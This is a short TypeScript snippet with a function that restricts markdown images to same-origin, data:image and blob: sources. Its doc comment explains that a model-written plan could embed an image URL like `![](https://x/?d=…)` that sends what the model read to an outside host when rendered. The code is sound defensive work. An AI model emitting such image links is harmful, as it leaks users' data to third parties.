/**
 * Pictures in markdown load from planestro only: an image from anywhere else is fetched the moment the text is shown,
 * so a plan or note a model wrote could carry `![](https://x/?d=…)` and send what it read to that host. Those are
 * shown as links instead. The app shell's CSP (`appCsp`) refuses them too.
 */
export const loadsHere = (src?: string): boolean => Boolean(src) && (/^\/(?!\/)/.test(src!) || /^data:image\//i.test(src!) || src!.startsWith('blob:'));
